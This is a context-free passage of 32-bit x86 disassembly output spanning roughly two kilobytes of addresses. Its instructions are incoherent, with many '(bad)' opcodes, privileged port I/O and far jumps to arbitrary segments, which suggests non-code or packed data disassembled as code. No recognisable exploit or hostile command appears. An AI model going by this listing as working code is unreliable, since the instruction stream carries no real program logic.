  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	enter  0x7d91,0xe7
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x4077cd
  40775c:	jo     0x4077c1
  40775e:	sar    DWORD PTR [esi],0xd7
  407761:	pop    ss
  407762:	adc    DWORD PTR [ecx],ecx
  407764:	fnstenv [eax-0x72]
  407767:	aaa    
  407768:	add    DWORD PTR [edi],ebp
  40776a:	mov    bh,0xfa
  40776c:	cmp    DWORD PTR [ecx+0x5bdecb78],eax
  407772:	sub    eax,0x676a7289
  407777:	adc    ecx,DWORD PTR [edi]
  407779:	push   edx
  40777a:	retf   0x2187
  40777d:	mov    ds:0xe27eef0,al
  407782:	jbe    0x4077ae
  407784:	add    dl,BYTE PTR [edx-0x415bde18]
  40778a:	cdq    
  40778b:	fst    DWORD PTR [ecx-0x23cbd1d0]
  407791:	bnd ja 0x407716
  407794:	xor    bl,BYTE PTR [ecx]
  407796:	jnp    0x4077c9
  407798:	loop   0x407720
  40779a:	pop    edi
  40779b:	mov    edx,0xf4470339
  4077a0:	arpl   WORD PTR [edi-0x6b],ax
  4077a3:	sub    dh,BYTE PTR [ebx-0x22]
  4077a6:	pop    esp
  4077a7:	arpl   WORD PTR [eax-0x54],bx
  4077aa:	outs   dx,BYTE PTR ds:[esi]
  4077ab:	mov    al,0x12
  4077ad:	in     eax,0x64
  4077af:	dec    ecx
  4077b0:	adc    al,0xb8
  4077b2:	add    BYTE PTR [ecx+0x606e18d3],dl
  4077b8:	jbe    0x407780
  4077ba:	ins    BYTE PTR es:[edi],dx
  4077bb:	loope  0x407795
  4077bd:	push   ss
  4077be:	and    DWORD PTR [ecx-0x456b7a6a],esp
  4077c4:	push   ss
  4077c5:	outs   dx,DWORD PTR ds:[esi]
  4077c6:	jbe    0x407773
  4077c8:	(bad)  
  4077c9:	pop    esp
  4077ca:	fldcw  WORD PTR [edx+0x788632ff]
  4077d0:	add    al,0x9
  4077d2:	pusha  
  4077d3:	add    eax,0x846d179f
  4077d8:	call   DWORD PTR [esi+0x2d47c0e2]
  4077de:	add    DWORD PTR [ebx+0x6],esi
  4077e1:	nop
  4077e2:	jmp    0x407806
  4077e4:	or     eax,DWORD PTR [ecx+0x15d1ee0c]
  4077ea:	cld    
  4077eb:	(bad)  
  4077ec:	and    ch,cl
  4077ee:	lods   eax,DWORD PTR ds:[esi]
  4077ef:	das    
  4077f0:	in     eax,0x84
  4077f2:	cmp    al,0xe9
  4077f4:	iret   
  4077f5:	push   0xfffffff2
  4077f7:	aaa    
  4077f8:	sti    
  4077f9:	dec    DWORD PTR [edi+0x1]
  4077fc:	in     eax,dx
  4077fd:	or     esp,edx
  4077ff:	lods   al,BYTE PTR ds:[esi]
  407800:	inc    ecx
  407801:	je     0x407811
  407803:	popf   
  407804:	mov    ds:0xec18e962,eax
  407809:	xchg   esi,eax
  40780a:	adc    DWORD PTR [esi-0x77],esp
  40780d:	cmp    eax,0x28e880f8
  407812:	xchg   edi,eax
  407813:	fs jae 0x407886
  407816:	lahf   
  407817:	sbb    bh,cl
  407819:	mov    cs,WORD PTR ds:0x66fab731
  40781f:	mul    DWORD PTR [edx+0x1b]
  407822:	add    DWORD PTR [edx],ecx
  407824:	adc    DWORD PTR [esi+0x734aca81],ecx
  40782a:	inc    edi
  40782b:	ret    0x2d56
  40782e:	rcl    BYTE PTR [esi+0x5d],cl
  407831:	icebp  
  407832:	jp     0x4077cb
  407834:	or     bh,BYTE PTR [ecx+0x53]
  407837:	daa    
  407838:	in     al,dx
  407839:	shr    ebx,1
  40783b:	pop    ds
  40783c:	mov    dh,0xde
  40783e:	loope  0x4077c3
  407840:	lahf   
  407841:	dec    ebx
  407842:	xchg   al,bh
  407844:	pop    edi
  407845:	pop    ss
  407846:	push   esi
  407847:	mov    dh,0x5a
  407849:	pop    edx
  40784a:	cmp    bh,dh
  40784c:	mov    bl,0x35
  40784e:	xor    eax,0xc570ca80
  407853:	xchg   BYTE PTR [edx-0x65],ah
  407856:	or     bh,BYTE PTR [ebx-0x285ed1bf]
  40785c:	int3   
  40785d:	and    eax,0x24393d79
  407862:	or     eax,0x7d8815b0
  407867:	dec    esp
  407868:	fst    DWORD PTR [ebx+0x774f2a13]
  40786e:	mov    esi,0x54b2d63d
  407873:	sub    ebp,DWORD PTR [ebp+0x16]
  407876:	mov    ecx,DWORD PTR [edx+0x6331bde7]
  40787c:	mov    esi,0xc5030889
  407881:	cmp    al,0x47
  407883:	add    DWORD PTR [ebx],esi
  407885:	icebp  
  407886:	mov    dh,ah
  407888:	and    ah,bh
  40788a:	je     0x4078d6
  40788c:	arpl   WORD PTR [esi],bp
  40788e:	mov    edx,0x9e595602
  407893:	aam    0x1f
  407895:	(bad)  
  407896:	in     al,dx
  407897:	lods   eax,DWORD PTR ds:[esi]
  407898:	push   eax
  407899:	int    0x31
  40789b:	xchg   ebx,eax
  40789c:	dec    ebp
  40789d:	outs   dx,DWORD PTR ds:[esi]
  40789e:	jmp    0xe39f:0xf883dca2
  4078a5:	pushf  
  4078a6:	aaa    
  4078a7:	dec    ecx
  4078a8:	sub    esi,DWORD PTR [edx+0x18ac8838]
  4078ae:	jp     0x407906
  4078b0:	xor    eax,0xe1d77ac1
  4078b5:	and    BYTE PTR [eax],al
  4078b7:	jns    0x4078dc
  4078b9:	out    0x57,al
  4078bb:	add    DWORD PTR [ecx],ecx
  4078bd:	fcomp  QWORD PTR [edx-0x15a55036]
  4078c3:	and    eax,0x49126d35
  4078c8:	aam    0xdc
  4078ca:	mov    cl,0x8
  4078cc:	sub    BYTE PTR ds:0x4f5674c3,ah
  4078d2:	pusha  
  4078d3:	arpl   WORD PTR ds:0x47f9a06b,cx
  4078d9:	inc    esi
  4078da:	sub    edx,DWORD PTR [ebx]
  4078dc:	jmp    0x42f5692c
  4078e1:	out    dx,eax
  4078e2:	push   ss
  4078e3:	pop    edx
  4078e4:	sbb    eax,0x1c604caa
  4078e9:	cmp    eax,0x8796db5b
  4078ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ef:	aas    
  4078f0:	sub    dl,BYTE PTR [ebx]
  4078f2:	hlt    
  4078f3:	mov    cl,0x31
  4078f5:	or     DWORD PTR [esi+0x3],0xffffffa4
  4078f9:	push   ebx
  4078fa:	leave  
  4078fb:	mov    cl,0x32
  4078fd:	aaa    
  4078fe:	pop    esp
  4078ff:	lds    edx,FWORD PTR [ecx]
  407901:	das    
  407902:	call   0x66ac:0xe0b39e9e
  407909:	daa    
  40790a:	dec    eax
  40790b:	mov    ds:0xe482d8f1,eax
  407910:	jle    0x4078ee
  407912:	mov    dh,0x1c
  407914:	mov    ds:0xd7c87509,al
  407919:	sbb    eax,ebx
  40791b:	pushf  
  40791c:	inc    ebx
  40791d:	repnz popf 
  40791f:	loope  0x407911
  407921:	add    BYTE PTR [edx],dh
  407923:	dec    esp
  407924:	scas   al,BYTE PTR es:[edi]
  407925:	out    dx,eax
  407926:	sub    eax,0x6a6fe06f
  40792b:	mov    WORD PTR [esi],ds
  40792d:	dec    esp
  40792e:	or     BYTE PTR [edx-0x12c55be1],dl
  407934:	xor    al,0x9f
  407936:	das    
  407937:	sahf   
  407938:	mov    ebx,0xa8cbfc8
  40793d:	and    eax,0xe6841145
  407942:	mov    eax,ds:0xfc999c0f
  407947:	loop   0x4079ba
  407949:	retf   
  40794a:	loopne 0x407963
  40794c:	cmp    al,0x99
  40794e:	inc    ebp
  40794f:	mov    ds:0x6a64147b,eax
  407954:	jne    0x407931
  407956:	stc    
  407957:	dec    ebx
  407958:	push   es
  407959:	pop    ss
  40795a:	aad    0x48
  40795c:	aaa    
  40795d:	icebp  
  40795e:	inc    ecx
  40795f:	add    eax,0x9e9970f2
  407964:	(bad)  
  407965:	sti    
  407966:	dec    ebp
  407967:	mov    eax,ds:0x2de4399
  40796c:	adc    ebp,DWORD PTR [esi+eiz*4-0x4a]
  407970:	fiadd  DWORD PTR [edx-0x5f63ef1d]
  407976:	shl    ah,0xd3
  407979:	or     cl,0x72
  40797c:	xchg   DWORD PTR [ebx+0x126b1bb1],esp
  407982:	jnp    0x407952
  407984:	or     dh,BYTE PTR [edi+0x736dcdf5]
  40798a:	push   ecx
  40798b:	and    al,0x6c
  40798d:	dec    esi
  40798e:	js     0x4079b4
  407990:	mov    WORD PTR [edx+eiz*8-0xe47bc31],es
  407997:	add    dh,BYTE PTR [ebp-0x36]
  40799a:	jmp    0x853:0xa869802b
  4079a1:	pop    ecx
  4079a2:	gs jne 0x407927
  4079a5:	jmp    0x40798b
  4079a7:	xchg   dl,dl
  4079a9:	pop    edx
  4079aa:	ins    BYTE PTR es:[edi],dx
  4079ab:	aas    
  4079ac:	xchg   esi,eax
  4079ad:	push   ecx
  4079ae:	jecxz  0x40793e
  4079b0:	jbe    0x407a26
  4079b2:	push   ds
  4079b3:	scas   eax,DWORD PTR es:[edi]
  4079b4:	out    0xf4,al
  4079b6:	pushf  
  4079b7:	rcr    DWORD PTR [ecx-0x1901750f],0xab
  4079be:	xor    ch,BYTE PTR [bx+si]
  4079c1:	fidivr DWORD PTR [ecx-0x7b77fea4]
  4079c7:	add    DWORD PTR [ebx],ebp
  4079c9:	je     0x4079ba
  4079cb:	jo     0x4079d3
  4079cd:	scas   al,BYTE PTR es:[edi]
  4079ce:	xor    DWORD PTR [ebx],edi
  4079d0:	cdq    
  4079d1:	push   es
  4079d2:	xor    ah,BYTE PTR [ecx+0x7b]
  4079d5:	mov    ds:0xa1ce4f02,eax
  4079da:	push   0xc86e7e24
  4079df:	aam    0x36
  4079e1:	adc    bh,BYTE PTR gs:[ecx+ebp*1-0x2f7b07ce]
  4079e9:	xchg   ecx,eax
  4079ea:	aad    0xb9
  4079ec:	adc    DWORD PTR [eax+0x2eb534d2],edx
  4079f2:	and    al,dh
  4079f4:	fdivr  st,st(2)
  4079f6:	add    edx,DWORD PTR [ebx+0x9]
  4079f9:	add    DWORD PTR ds:0x8bb109e1,0xfffffff1
  407a00:	cmp    al,0x6d
  407a02:	inc    edx
  407a03:	sub    edx,edx
  407a05:	jl     0x4079fb
  407a07:	ds mov ch,0x4
  407a0a:	add    BYTE PTR [esi-0x67],ch
  407a0d:	inc    edi
  407a0e:	pusha  
  407a0f:	xchg   ebx,eax
  407a10:	and    eax,ebx
  407a12:	mov    ebp,0xa6b748f9
  407a17:	dec    ebp
  407a18:	and    al,0x0
  407a1a:	mov    BYTE PTR [edi-0x45],al
  407a1d:	cmp    esi,DWORD PTR [edx-0x26]
  407a20:	or     al,0xa8
  407a22:	mov    dh,0x6b
  407a24:	dec    edi
  407a25:	xchg   esi,eax
  407a26:	mov    al,ds:0xcffbad4a
  407a2b:	in     al,0x70
  407a2d:	and    ch,al
  407a2f:	pop    edx
  407a30:	jg     0x407a20
  407a32:	jmp    0x9e5e:0x2342d4d7
  407a39:	inc    ebx
  407a3a:	daa    
  407a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a3c:	loope  0x407a20
  407a3e:	inc    edx
  407a3f:	arpl   WORD PTR [ebx],bp
  407a41:	cwde   
  407a42:	pusha  
  407a43:	push   eax
  407a44:	mov    al,0x92
  407a46:	adc    DWORD PTR [ecx],edx
  407a48:	rol    DWORD PTR [ebx-0x2a],0xa3
  407a4c:	cmp    eax,0x78966678
  407a51:	add    DWORD PTR [edx+ecx*8-0x7e],ebp
  407a55:	mov    bh,0x3c
  407a57:	pop    edx
  407a58:	sbb    al,0xf3
  407a5a:	xchg   DWORD PTR [esp+ecx*4-0x22083fe7],ebx
  407a61:	xchg   ecx,eax
  407a62:	sahf   
  407a63:	mov    ebx,0xcfceec67
  407a68:	jno    0x407a58
  407a6a:	sbb    esp,DWORD PTR [edi-0xb401b2d]
  407a70:	retf   
  407a71:	enter  0xc89a,0x37
  407a75:	lods   al,BYTE PTR ds:[esi]
  407a76:	inc    edx
  407a77:	rol    BYTE PTR [esi],0x8c
  407a7a:	lods   eax,DWORD PTR ds:[esi]
  407a7b:	push   edx
  407a7c:	adc    BYTE PTR [edi+0x67832128],0x17
  407a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a85:	adc    eax,DWORD PTR [esi-0x1326963e]
  407a8b:	sahf   
  407a8c:	jp     0x407a8a
  407a8e:	test   al,0xf6
  407a90:	xor    BYTE PTR [esi],dl
  407a92:	imul   esp,DWORD PTR [esi+ecx*1+0x67],0xffffff8b
  407a97:	das    
  407a98:	mov    ds:0x26152dc4,eax
  407a9d:	fiadd  DWORD PTR gs:[edx+0x2f]
  407aa1:	repz mov dh,0xc3
  407aa4:	test   DWORD PTR [edi-0x50548bc8],ebx
  407aaa:	pop    ds
  407aab:	sub    BYTE PTR [eax-0x69],ah
  407aae:	cmp    BYTE PTR [eax-0x4f],0x74
  407ab2:	or     eax,0x3328150d
  407ab7:	lsl    edx,WORD PTR [ebx+0x42]
  407abb:	hlt    
  407abc:	jecxz  0x407aee
  407abe:	cmp    ecx,edi
  407ac0:	add    eax,0x36f160d2
  407ac5:	mov    eax,0x6a76a08f
  407aca:	test   al,0xf8
  407acc:	and    BYTE PTR [ebp-0x66],ah
  407acf:	fdiv   DWORD PTR [edi]
  407ad1:	loope  0x407a76
  407ad3:	dec    esp
  407ad4:	inc    edi
  407ad5:	in     eax,dx
  407ad6:	sbb    al,0x80
  407ad8:	sti    
  407ad9:	cmp    DWORD PTR [ecx],ebp
  407adb:	(bad)  
  407adc:	pop    ss
  407add:	xor    BYTE PTR [esi-0x1e793945],cl
  407ae3:	icebp  
  407ae4:	xchg   ecx,eax
  407ae5:	pop    ebx
  407ae6:	xchg   edi,eax
  407ae7:	push   es
  407ae8:	fs pushf 
  407aea:	push   ecx
  407aeb:	(bad)  
  407aed:	sub    eax,0xe0892b44
  407af2:	outs   dx,BYTE PTR ds:[esi]
  407af3:	cmp    BYTE PTR [ecx],0x97
  407af6:	repz inc edi
  407af8:	mov    esi,0x4bb0367f
  407afd:	dec    esi
  407afe:	mov    cl,0x58
  407b00:	loop   0x407b2c
  407b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b03:	add    eax,esi
  407b05:	(bad)  
  407b06:	and    eax,0x5a1017f
  407b0b:	add    dh,BYTE PTR [eax+ebx*4+0x38]
  407b0f:	pop    ebx
  407b10:	jge    0x407b7e
  407b12:	push   ss
  407b13:	arpl   WORD PTR [eax+0x36],cx
  407b16:	aaa    
  407b17:	clc    
  407b18:	xor    DWORD PTR [ecx-0x6c],ebp
  407b1b:	lods   al,BYTE PTR ds:[esi]
  407b1c:	jb     0x407b08
  407b1e:	fst    DWORD PTR [ebx+0x3fa089ec]
  407b24:	out    0x89,eax
  407b26:	sbb    ah,bh
  407b28:	push   esp
  407b29:	mov    cl,BYTE PTR [ecx]
  407b2b:	add    BYTE PTR [ebp-0x3e73c862],ah
  407b31:	ss sub al,0xf3
  407b34:	xor    esi,eax
  407b36:	mov    ebx,0x55e8fdad
  407b3b:	scas   al,BYTE PTR es:[edi]
  407b3c:	repz add DWORD PTR [edx-0x32ea1e25],esi
  407b43:	fwait
  407b44:	enter  0x7641,0x9a
  407b48:	xlat   BYTE PTR ds:[ebx]
  407b49:	repz add bl,ch
  407b4c:	add    ebx,DWORD PTR [ebx-0x45]
  407b4f:	sub    eax,0x54e46981
  407b54:	sbb    edi,DWORD PTR [ebp+0x53]
  407b57:	pusha  
  407b58:	adc    eax,0xe242ba9e
  407b5d:	enter  0x6b07,0x6d
  407b61:	fsub   QWORD PTR [eax-0x46676c14]
  407b67:	sbb    al,0x65
  407b69:	adc    eax,0x8c6771f1
  407b6e:	push   ebp
  407b6f:	aad    0xd7
  407b71:	out    0x8d,eax
  407b73:	push   edx
  407b74:	sbb    BYTE PTR [esi-0x3e],al
  407b77:	mov    eax,ds:0x1fbaf6b7
  407b7c:	js     0x407b91
  407b7e:	push   esi
  407b7f:	adc    esi,DWORD PTR [ebp+0x79]
  407b82:	push   ebp
  407b83:	mov    DWORD PTR [ebx-0x79ebbe81],edx
  407b89:	and    cl,cl
  407b8b:	mov    al,BYTE PTR ds:0xbb0efe9d
  407b91:	inc    eax
  407b92:	(bad)  
  407b93:	fidiv  WORD PTR [ebp-0x12]
  407b96:	test   esp,0x7cb71476
  407b9c:	test   DWORD PTR [edi+ebp*1],ebp
  407b9f:	loop   0x407bf2
  407ba1:	pop    edx
  407ba2:	push   cs
  407ba3:	imul   BYTE PTR [eax]
  407ba5:	jnp    0x407bb1
  407ba7:	sbb    al,0xee
  407ba9:	or     DWORD PTR [esi],edi
  407bab:	retf   0x56ae
  407bae:	in     eax,0xdb
  407bb0:	xor    eax,0x815472c0
  407bb5:	les    edx,FWORD PTR [eax-0xd618577]
  407bbb:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407bbd:	push   ebx
  407bbe:	jmp    0x8ebabd8f
  407bc3:	clc    
  407bc4:	addr16 jle 0x407b8e
  407bc7:	add    BYTE PTR [ecx],dh
  407bc9:	lods   al,BYTE PTR ds:[esi]
  407bca:	iret   
  407bcb:	xchg   esi,eax
  407bcc:	loope  0x407c19
  407bce:	add    eax,0x5cbbe7e6
  407bd3:	icebp  
  407bd4:	mov    edx,0xaba85a8a
  407bd9:	data16 (bad) 
  407bdc:	lock add al,0xab
  407bdf:	pop    edx
  407be0:	sub    DWORD PTR [ebp-0x7c9b2651],edi
  407be6:	mov    dl,0x6a
  407be8:	pop    edx
  407be9:	hlt    
  407bea:	fnstcw WORD PTR [eax-0x3774560b]
  407bf0:	bound  edi,QWORD PTR [esi+edx*4+0x2e1d43d2]
  407bf7:	jmp    0x7d441159
  407bfc:	aaa    
  407bfd:	or     eax,0xccc7162f
  407c02:	cs mov ch,0x83
  407c05:	sub    al,ch
  407c07:	(bad)  
  407c08:	jmp    0xce4b:0xb021be33
  407c0f:	hlt    
  407c10:	(bad)  
  407c11:	cld    
  407c12:	xor    eax,0xc24f563b
  407c17:	mov    edx,ss
  407c19:	and    BYTE PTR [edx],0xb4
  407c1c:	rcl    BYTE PTR [ebp+0x70e3ada2],cl
  407c22:	dec    edx
  407c23:	pop    ecx
  407c24:	mov    ds:0x5808ddb0,eax
  407c29:	(bad)  
  407c2b:	(bad)  
  407c2c:	and    al,BYTE PTR [bp+di]
  407c2f:	jns    0x407bee
  407c31:	pop    ss
  407c32:	mov    ebx,0xf23d3af1
  407c37:	push   eax
  407c38:	jns    0x407cb7
  407c3a:	mov    esp,0x7e9e77e7
  407c3f:	and    DWORD PTR [eax-0x5c],0xe
  407c43:	icebp  
  407c44:	mov    ds:0xc16052a0,al
  407c49:	mov    dh,0x8a
  407c4b:	lds    edi,FWORD PTR [esi]
  407c4d:	scas   al,BYTE PTR es:[edi]
  407c4e:	and    DWORD PTR [edi+esi*2+0x290148],ecx
  407c55:	xor    ah,BYTE PTR [esi+eiz*4]
  407c58:	push   esp
  407c59:	xchg   esi,eax
  407c5a:	mov    ecx,0x4a2b3ad4
  407c5f:	jo     0x1fd07ccf
  407c65:	loopne 0x407c04
  407c67:	pop    ecx
  407c68:	push   cs
  407c69:	dec    esi
  407c6a:	push   ebp
  407c6b:	hlt    
  407c6c:	xor    BYTE PTR [ebx-0x7af729b0],dl
  407c72:	push   es
  407c73:	pop    es
  407c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c75:	cmp    al,0xe5
  407c77:	and    eax,0xea46a2f8
  407c7c:	cs stos BYTE PTR es:[edi],al
  407c7e:	jmp    0x6a81:0x638935dd
  407c85:	jl     0x407cb1
  407c87:	pusha  
  407c88:	sub    bx,WORD PTR [ecx+0x9ecd689]
  407c8f:	in     eax,dx
  407c90:	aaa    
  407c91:	int    0x22
  407c93:	cs int3 
  407c95:	jbe    0x407c87
  407c97:	enter  0x840c,0x87
  407c9b:	pop    edx
  407c9c:	imul   DWORD PTR [eax+eiz*4+0x26c8f60c]
  407ca3:	add    al,0x34
  407ca5:	adc    al,0x26
  407ca7:	fstp   st(6)
  407ca9:	push   ds
  407caa:	sub    ch,BYTE PTR ds:0xb3f38e08
  407cb0:	mov    cl,0x7b
  407cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb3:	call   0x3302:0xf0b68c7b
  407cba:	inc    edi
  407cbb:	pop    esi
  407cbc:	pushf  
  407cbd:	xchg   DWORD PTR [eax-0x1788d1ba],eax
  407cc3:	fsubr  DWORD PTR [ecx]
  407cc5:	add    eax,0x96ff41c1
  407cca:	mul    dl
  407ccc:	pop    ds
  407ccd:	xor    esi,DWORD PTR [esi+0x38]
  407cd0:	fmul   DWORD PTR ds:0x8917feea
  407cd6:	push   ebx
  407cd7:	gs xchg esi,eax
  407cd9:	aas    
  407cda:	jb     0x407ce6
  407cdc:	loop   0x407caa
  407cde:	loop   0x407c91
  407ce0:	and    esi,ecx
  407ce2:	push   edi
  407ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ce4:	test   eax,0xaf326c26
  407ce9:	adc    BYTE PTR [esi+0x14],dl
  407cec:	and    BYTE PTR gs:[edx+ebx*2-0x2720561e],dl
  407cf4:	sbb    ch,bl
  407cf6:	mul    ch
  407cf8:	(bad)  
  407cf9:	mov    eax,0xc20da3e5
  407cfe:	lods   eax,DWORD PTR ds:[esi]
  407cff:	cs (bad) 
  407d01:	mov    esp,0xaa385114
  407d06:	sahf   
  407d07:	imul   esp,ecx,0xaba243c1
  407d0d:	mov    ebp,0x6b66b2e9
  407d12:	imul   BYTE PTR [ebx+0x5971653c]
  407d18:	mov    ds:0xb8f46b22,eax
  407d1d:	js     0x407cd7
  407d1f:	std    
  407d20:	mov    BYTE PTR [esi+0x7d4fdf18],0x8
  407d27:	sbb    al,0x75
  407d29:	add    cl,bh
  407d2b:	shl    BYTE PTR [ebx],1
  407d2d:	mov    ah,0xd4
  407d2f:	fnsave [edx]
  407d31:	jmp    0x407d53
  407d33:	cmp    cl,BYTE PTR [ebx+0x72a5a66f]
  407d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d3a:	mov    bl,0x99
  407d3c:	sub    bh,BYTE PTR [edx]
  407d3e:	div    DWORD PTR es:0x3a41a8dd
  407d45:	cmc    
  407d46:	out    0x17,eax
  407d48:	icebp  
  407d49:	mov    ebx,0x8372fc84
  407d4e:	fistp  WORD PTR [edx+0x5fb05182]
  407d54:	cmp    BYTE PTR [edx],bh
  407d56:	mov    esi,0x4dfd7776
  407d5b:	(bad)  
  407d5c:	bound  esp,QWORD PTR [ecx+0x4cf1972f]
  407d62:	fwait
  407d63:	push   0x55faa597
  407d68:	xchg   ebx,eax
  407d69:	add    ecx,0xffffffc4
  407d6c:	test   BYTE PTR [ecx-0x43],0xf3
  407d70:	fnsave [edi+0x7]
  407d73:	mov    esi,0x1d3f526
  407d78:	mov    bl,0xa2
  407d7a:	xchg   esp,eax
  407d7b:	mov    ah,BYTE PTR [ebx+0x1a0d6c59]
  407d81:	(bad)  
  407d82:	or     esi,DWORD PTR [esi+edx*4+0x3ba34bd8]
  407d89:	mov    eax,0x80f7716
  407d8e:	push   0x343b285e
  407d93:	mov    al,ds:0xeba11972
  407d98:	inc    esp
  407d99:	stc    
  407d9a:	test   BYTE PTR [eax+eiz*2-0xc],dl
  407d9e:	mov    ebx,0xb35e3dd4
  407da3:	test   eax,0x439aa895
  407da8:	in     eax,dx
  407da9:	out    0x59,al
  407dab:	jne    0x407d83
  407dad:	loopne 0x407e2c
  407daf:	mov    edi,0xcd11ba7f
  407db4:	mov    esp,0x188f1523
  407db9:	loope  0x407d74
  407dbb:	sbb    DWORD PTR [ebx],esp
  407dbd:	popa   
  407dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dbf:	xchg   esi,eax
  407dc0:	dec    BYTE PTR [esi+0x699f3bc4]
  407dc6:	xlat   BYTE PTR ds:[ebx]
  407dc7:	pop    eax
  407dc8:	arpl   WORD PTR [edi],dx
  407dca:	push   edi
  407dcb:	lods   al,BYTE PTR ds:[esi]
  407dcc:	cmc    
  407dcd:	push   edi
  407dce:	dec    esp
  407dcf:	push   ds
  407dd0:	call   0x5fd8:0x4bf89a2
  407dd7:	pushf  
  407dd8:	ins    DWORD PTR es:[edi],dx
  407dd9:	fisub  WORD PTR [edx-0x31]
  407ddc:	dec    esp
  407ddd:	scas   al,BYTE PTR es:[edi]
  407dde:	xchg   esp,eax
  407ddf:	cli    
  407de0:	repnz das 
  407de2:	(bad)  
  407de3:	mov    ebx,0x8da554d4
  407de8:	cmp    BYTE PTR [eax+0x5ea6a672],0x26
  407def:	mov    dh,0x77
  407df1:	dec    esi
  407df2:	sar    eax,1
  407df4:	enter  0x4275,0x7b
  407df8:	popf   
  407df9:	sub    eax,0x14620563
  407dfe:	(bad)  
  407dff:	out    dx,eax
  407e00:	cmc    
  407e01:	and    cl,BYTE PTR [ecx-0x5262d7b8]
  407e07:	test   DWORD PTR [edx+0x600078a],ebp
  407e0d:	mov    bl,0x56
  407e0f:	adc    DWORD PTR [edi],edi
  407e11:	adc    eax,0xe0510143
  407e16:	or     edx,eax
  407e18:	xlat   BYTE PTR ds:[ebx]
  407e19:	push   eax
  407e1a:	mov    eax,0xcfb5e3c0
  407e1f:	fs and esi,esi
  407e22:	dec    ebx
  407e23:	xor    al,0x4a
  407e25:	cli    
  407e26:	mov    edi,0x28347cbc
  407e2b:	in     al,dx
  407e2c:	sbb    eax,0x74cebc8c
  407e31:	xor    DWORD PTR cs:[ebx],edx
  407e34:	push   cs
  407e35:	adc    ebp,esi
  407e37:	sbb    eax,0x4f911407
  407e3c:	mov    ebx,0x1bce20fe
  407e41:	sbb    DWORD PTR [ecx],eax
  407e43:	(bad)  
  407e44:	das    
  407e45:	dec    edx
  407e46:	cli    
  407e47:	stos   DWORD PTR es:[edi],eax
  407e48:	pop    edx
  407e49:	push   edx
  407e4a:	xchg   esi,eax
  407e4b:	ror    DWORD PTR [edi-0x2818fd5e],cl
  407e51:	stos   BYTE PTR es:[edi],al
  407e52:	push   edi
  407e53:	in     eax,0xab
  407e55:	outs   dx,DWORD PTR ds:[esi]
  407e56:	sub    DWORD PTR [edi+0x2ae8b669],0x69a58af9
  407e60:	pop    ecx
  407e61:	(bad)  
  407e62:	shl    DWORD PTR [eax],1
  407e64:	jnp    0x407e71
  407e66:	jae    0x407ee1
  407e68:	jl     0x407e3e
  407e6a:	xor    edi,DWORD PTR [ebp-0x33]
  407e6d:	mov    bl,0xc6
  407e6f:	dec    esp
  407e70:	add    eax,0x6de788a
  407e75:	int3   
  407e76:	xchg   ebx,eax
  407e78:	push   0xffffffb2
  407e7a:	retf   
  407e7b:	cli    
  407e7c:	clc    
  407e7d:	sub    ch,bl
  407e7f:	and    al,0x91
  407e81:	inc    eax
  407e82:	ins    BYTE PTR es:[edi],dx
  407e83:	add    esi,DWORD PTR [ebx]
  407e85:	xchg   esi,eax
  407e86:	iret   
  407e87:	add    eax,0xb65a4931
  407e8c:	outs   dx,BYTE PTR ds:[esi]
  407e8d:	cmp    eax,0xb008b4e0
  407e92:	mov    al,ds:0xbbb81a4d
  407e97:	test   eax,0xf5b58212
  407e9c:	aam    0x0
  407e9e:	sbb    edi,DWORD PTR ds:0x9fb5f08b
  407ea4:	sub    al,BYTE PTR [esi+edx*4+0x8]
  407ea8:	test   DWORD PTR [esi+0x65b44ee7],esi
  407eae:	dec    ecx
  407eaf:	mov    ds,WORD PTR [edi+0x47]
  407eb2:	add    edx,DWORD PTR [ebp-0x4f]
  407eb5:	sub    BYTE PTR [ebx+0x73],dl
  407eb8:	cmp    eax,0x29a8b2b9
  407ebd:	or     DWORD PTR [eax+0x2],edi
  407ec0:	bswap  ecx
  407ec2:	outs   dx,BYTE PTR ds:[esi]
  407ec3:	adc    DWORD PTR [eax-0x11],ecx
  407ec6:	ficom  WORD PTR [edi+0x7f]
  407ec9:	ret    0xcf92
  407ecc:	sub    al,0x43
  407ece:	dec    eax
  407ecf:	pop    esp
  407ed0:	aaa    
  407ed1:	add    eax,0x94f2c71
  407ed6:	mov    ss:0xf3a65b1d,al
  407edc:	ret    
  407edd:	in     al,dx
  407ede:	arpl   WORD PTR [ebx+0x12],sp
  407ee1:	xor    al,0x57
  407ee3:	lods   al,BYTE PTR ds:[esi]
  407ee4:	sar    dl,1
  407ee6:	xor    BYTE PTR [edx-0x70ff4f69],0xa7
  407eed:	sub    bh,BYTE PTR [ebp-0x74847e5e]
  407ef3:	lock popf 
  407ef5:	push   esi
  407ef6:	push   edx
  407ef7:	out    dx,eax
  407ef8:	sti    
  407ef9:	test   DWORD PTR [ebx],ebp
  407efb:	mov    ah,0x6
  407efd:	mov    edx,0xa1f44def
  407f02:	int3   
  407f03:	repnz cmp ecx,DWORD PTR [ecx-0x49]
  407f07:	push   ebp
  407f09:	add    ebx,0x2f
  407f0c:	in     eax,0x3a
  407f0e:	add    al,0x54
  407f10:	std    
  407f11:	sti    
  407f12:	(bad)  
  407f13:	mov    ebx,0x3243ee73
  407f18:	sbb    al,0x8
  407f1a:	sar    BYTE PTR [esi-0x43],1
  407f1d:	cmp    DWORD PTR [eax],0x73
  407f20:	push   ds
  407f21:	sub    esp,DWORD PTR ds:0x26a807d7
  407f27:	retf   0xd74c
  407f2a:	fs fadd QWORD PTR ss:[ecx-0x19]
  407f2f:	loope  0x407fa2
  407f31:	xchg   ebx,eax
  407f32:	mov    ah,0x4a
  407f34:	jge    0x407f41
  407f36:	shl    BYTE PTR [ecx+eiz*8],1
  407f39:	lahf   
  407f3a:	addr16 sbb esi,esp
